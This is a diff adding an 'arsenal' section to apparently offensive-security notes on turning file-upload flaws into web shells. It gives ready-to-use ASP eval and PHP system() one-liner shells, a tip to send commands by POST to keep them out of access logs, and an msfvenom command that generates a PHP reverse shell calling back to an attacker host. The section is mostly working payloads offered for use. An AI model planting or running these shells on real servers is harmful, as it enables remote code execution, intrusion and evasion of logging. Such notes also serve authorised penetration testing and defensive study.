@@ -73,3 +73,31 @@ GET /uploads/shell.php?c=id        # execute, or OOB callback if blind
 
 ## Real-world
 Extension + magic-byte bypass to web shell is a top RCE bug-bounty class; `.htaccess`/`web.config` upload, SVG stored XSS, and ImageTragick are recurring real CVEs/reports.
+
+## Web shell arsenal + classic ASP one-liner
+
+Ready-made shells beat hand-rolled ones when tooling access allows: phpbash
+(terminal-style semi-interactive PHP shell) and the SecLists Web-Shells collection
+(`/usr/share/seclists/Web-Shells`, per-language shells and reverse-shell scripts).
+
+Minimal classic ASP shell (the page carries PHP/JSP/ASPX one-liners but not ASP):
+
+```asp
+<% eval request('cmd') %>
+```
+
+Drive it the same way: `GET /uploads/shell.asp?cmd=whoami`.
+
+PHP variant worth defaulting to (accepts the command over GET or POST; POST keeps it
+out of access logs):
+
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+
+For the reverse-shell route through an upload (edit IP/port in a PHP reverse-shell
+script, or generate with `msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw`),
+see [[reverse-shells]]; prefer it over the web shell when egress allows, fall back to
+the web shell when egress filtering or disabled functions block the callback.
+
+<!-- promoted-slug: upload-webshell-arsenal-asp-oneliner -->
